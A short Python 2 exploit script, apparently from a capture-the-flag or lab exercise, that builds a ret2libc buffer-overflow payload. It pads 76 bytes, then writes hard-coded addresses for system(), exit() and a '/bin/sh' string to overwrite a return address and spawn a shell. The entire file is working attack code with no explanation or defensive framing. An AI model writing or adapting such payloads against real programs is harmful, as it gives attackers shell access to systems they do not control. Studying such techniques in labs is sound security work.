#! /usr/bin/python

import struct

def p(x):
	return struct.pack("<I", x)

def exploit():
	bin_sh_ad = 0xf7f5ac28
	system_ad = 0xf7e38840
	exit_ad = 0xf7e2c7f0

	payload = "A"*(72+4)
	payload += p(system_ad)
	payload += p(exit_ad)
	payload += p(bin_sh_ad)

	print payload

exploit()
